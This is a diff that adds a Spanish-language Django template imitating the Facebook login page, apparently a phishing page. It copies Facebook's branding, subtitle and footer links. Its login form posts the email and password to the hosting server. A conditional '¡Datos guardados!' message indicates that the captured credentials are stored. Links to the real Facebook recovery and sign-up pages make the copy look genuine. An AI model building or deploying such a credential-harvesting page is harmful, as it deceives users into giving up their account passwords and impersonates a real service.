@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <!-- Viewport responsivo para Android, iPhone, tablets, etc -->
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Facebook – Inicia sesión o regístrate</title>
+    {% load static %}
+    <link rel="stylesheet" href="{% static 'styles.css' %}" />
+  </head>
+  <body>
+    <div class="container">
+      <div class="left-section">
+        <h1 class="logo">facebook</h1>
+        <p class="subtitle">
+          Facebook te ayuda a comunicarte y compartir con las personas que
+          forman parte de tu vida.
+        </p>
+      </div>
+      <div class="right-section">
+        <form class="login-form" method="POST">
+          {% csrf_token %}
+          <input
+            type="text"
+            name="email"
+            placeholder="Correo electrónico o número de teléfono"
+            required
+          />
+          <input
+            type="password"
+            name="password"
+            placeholder="Contraseña"
+            required
+          />
+          <button class="login-btn" type="submit">Iniciar sesión</button>
+          <a
+            href="https://web.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"
+            class="forgot-link"
+            >¿Olvidaste tu contraseña?</a
+          >
+          <hr />
+          <button
+            class="create-account-btn"
+            type="button"
+            onclick="window.location.href='https://web.facebook.com/r.php?entry_point=login'"
+          >
+            Crear cuenta nueva
+          </button>
+        </form>
+        {% if success %}
+        <div style="color: green; margin-top: 15px">¡Datos guardados!</div>
+        {% endif %}
+        <p class="create-page">
+          <b>Crea una página</b> para una celebridad, una marca o un negocio.
+        </p>
+      </div>
+    </div>
+    <footer>
+      <div class="languages">
+        Español &nbsp; English (US) &nbsp; Français (France) &nbsp; Português
+        (Brasil) &nbsp; Italiano &nbsp; Deutsch &nbsp; العربية &nbsp; हिन्दी
+        &nbsp; 中文(简体) &nbsp; 日本語
+        <button class="lang-plus">+</button>
+      </div>
+      <div class="footer-links">
+        Registrarte &nbsp; Iniciar sesión &nbsp; Messenger &nbsp; Facebook Lite
+        &nbsp; Video &nbsp; Meta Pay &nbsp; Tienda de Meta &nbsp; Meta Quest
+        &nbsp; Ray-Ban Meta &nbsp; Meta AI &nbsp; Instagram &nbsp; Threads
+        &nbsp; Centro de información de votación &nbsp; Política de privacidad
+        &nbsp; Centro de privacidad &nbsp; Información &nbsp; Crear anuncio
+        &nbsp; Crear página &nbsp; Desarrolladores &nbsp; Empleo &nbsp; Cookies
+        &nbsp; Opciones de anuncios &nbsp; Condiciones &nbsp; Ayuda &nbsp;
+        Importación de contactos y no usuarios
+      </div>
+      <div class="meta">Meta © 2025</div>
+    </footer>
+  </body>
+</html>
